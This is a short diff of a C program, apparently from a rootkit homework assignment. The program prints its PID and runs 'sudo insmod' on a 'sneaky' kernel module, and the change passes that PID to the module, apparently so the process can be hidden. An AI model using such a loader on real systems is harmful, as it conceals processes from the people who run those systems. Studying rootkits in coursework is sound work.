@@ -6,6 +6,8 @@
 
 #define COPY_PWD 1
 
+#define MAXVAL 5
+
 
 int main()
 {
@@ -14,6 +16,7 @@ int main()
 	int status; 
 
 	// #1: Your program should print its own process ID to the screen
+	
 	printf("sneaky_process pid = %d\n", pid);
 
 	if (COPY_PWD) 
@@ -28,7 +31,16 @@ int main()
 
 
 	// #3: Load the sneaky module (sneaky_mod.ko) using “insmod” command
-	status=system("sudo insmod sneaky_mod.ko");
+
+	char message_3[50];
+	sprintf (message_3, "sudo insmod sneaky_mod.ko sneaky_process_pid=%d",pid);
+
+	//printf(message_3); 
+	//return 0; 
+
+	//sneaky_process_pid=
+
+	status=system(message_3);
 
 	// #4: enter a loop, reading characters from keyboard until receiving 'q'
 	int more=1; 
